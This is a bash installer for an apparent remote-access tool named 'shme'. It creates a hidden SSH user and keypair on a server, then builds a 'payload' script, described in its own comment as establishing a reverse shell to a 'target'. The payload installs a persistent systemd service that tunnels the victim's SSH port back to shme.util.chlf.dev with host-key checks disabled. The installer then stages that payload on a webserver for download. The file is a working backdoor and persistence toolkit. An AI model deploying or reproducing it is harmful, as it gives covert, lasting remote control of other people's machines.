#!/bin/bash
# Installation file shme server

# CONFIG #
SRVHOST="shme.util.chlf.dev"
SRVSSH=22
RMTFWD=9001
###

# check run as 'root'
if [[ "$(id -u)" > "0" ]]; then
    echo "[!] Please run script as root."
    exit
fi

# dependency check
depList=""

openssl > /dev/null 2>&1
if (($? > 0)); then
    echo "[!] Missing dependency \"openssl\""
    depList+=" openssl"
fi

ssh -V > /dev/null 2>&1
if (($? > 0)); then
    echo "[!] Missing dependency \"openssh-client\""
    depList+=" openssh-client"
fi

# if dependencies missing - install them

if ((${#depList} > 0)); then
    echo "[~] Installing$depList"
    apt install$depList -y > /dev/null
    # err handling
    if (($? > 0)); then
        echo "[!] An error occurred instaling dependencies..."
        exit
    else
        echo "[✔] Dependencies installed."
    fi
else
    echo "[✔] Dependencies exist."
fi


# create user
rmtUser="shme_"$(openssl rand -hex 12)
adduser --shell /bin/true --gecos "" --disabled-password $rmtUser > /dev/null 2>&1
# err handling
if (($? > 0)); then
    echo "[!] An error occurred creating remote user \"$rmtUser\""
    exit
else
    echo "[✔] Remote user \"$rmtUser\" created"
fi

# generate keypair
mkdir -p keys
rm keys/*
ssh-keygen -f keys/$rmtUser -N "" > /dev/null
# err handling
if (($? > 0)); then
    echo "[!] An error occurred creating ssh key pair"
    exit
else
    echo "[✔] Created ssh key pair"
fi


# add keypair to user authorized_keys
mkdir -p /home/$rmtUser/.ssh/
cat keys/$rmtUser.pub > /home/$rmtUser/.ssh/authorized_keys

# generate systemd file
mkdir -p payloads
rm payloads/*
touch payloads/shme.sh
printf "#!/bin/bash
    # single run installation script to establish reverse shell remote access to target

    # check run as 'root'
    if (((id -u) > 0)); then
        echo \"[!] Please run script as root.\"
        exit
    fi

    # drop certificate file
    touch ~/.ssh/$rmtUser
    b64crt=\"$(base64 keys/$rmtUser)\"
    echo \"echo \"\$b64crt\" | base64 --decode\" > ~/.ssh/$rmtUser

    # drop systemd file
    touch /etc/systemd/system/shme.service
    printf \"[Unit]
            Description=Remote SSH tunnel to $SRVHOST as user $rmtUser
            Wants=network-online.target
            After=network-online.target
            StartLimitIntervalSec=0

            [Service]
            Type=simple
            ExecStart=/usr/bin/ssh -qNn \\\\n
                -o ServerAliveInterval=30 \\\\n
                -o ServerAliveCountMax=3 \\\\n
                -o ExitOnForwardFailure=yes \\\\n
                -o StrictHostKeyChecking=no \\\\n
                -o UserKnownHostsFile=/dev/null \\\\n
                -i ~/.ssh/$rmtUser \\\\n
                -R $RMTFWD:localhost:22 \\\\n
                $rmtUser@$SRVHOST -p $SRVSSH
            Restart=always
            RestartSec=60

            [Install]
            WantedBy=multi-user.target\" > /etc/systemd/system/shme.service

    sudo systemctl enable --now shme.service" > payloads/shme.sh

# err handling
if (($? > 0)); then
    echo "[!] An error occurred generating payload file"
    exit
else
    echo "[✔] Generated payload file"
fi

# copy shme.sh to webserver directory
cp payloads/shme.sh /var/www/shme/
# err handling
if (($? > 0)); then
    echo "[!] An error occurred copying payload to webserver"
    exit
else
    echo "[✔] Payload file uploaded to webserver"
fi